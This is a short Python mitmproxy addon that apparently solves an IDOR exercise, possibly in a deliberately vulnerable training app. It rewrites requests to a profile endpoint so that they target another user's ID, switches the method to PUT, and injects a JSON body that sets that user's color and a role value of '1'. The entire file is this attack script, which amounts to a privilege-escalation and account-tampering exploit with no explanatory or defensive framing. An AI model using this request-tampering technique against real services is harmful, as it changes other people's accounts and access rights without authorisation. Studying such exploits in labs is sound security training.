from mitmproxy import http
from mitmproxy import ctx

import json

def request(flow: http.HTTPFlow) -> None:
  if 'IDOR/profile' in flow.request.url:
    url = flow.request.url.replace('%7BuserId%7D', '2342388')
    flow.request.url = url
    flow.request.method = 'PUT'
    flow.request.headers['content-type'] = 'application/json; charset=UTF-8'
    flow.request.text = json.dumps({
      "userId": '2342388',
      'color': 'red',
      'role': "1",
    })